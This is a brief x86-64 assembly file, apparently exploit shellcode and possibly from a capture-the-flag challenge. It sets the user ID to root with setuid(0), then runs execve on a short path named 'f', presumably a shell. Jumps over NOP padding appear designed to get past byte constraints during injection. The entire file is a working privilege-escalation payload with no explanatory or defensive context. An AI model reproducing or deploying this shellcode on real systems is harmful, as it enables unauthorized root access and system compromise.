.intel_syntax noprefix
.global _start
.text
_start:
        xor rdi, rdi
          mov al, 105
          syscall
          jmp next

          .rept 11
          nop
          .endr

          next:
          push 0x66
          mov rdi, rsp
          xor edx, edx
          jmp next2

          .rept 11
          nop
          .endr

          next2:
          xor esi,esi
          mov al,59
          syscall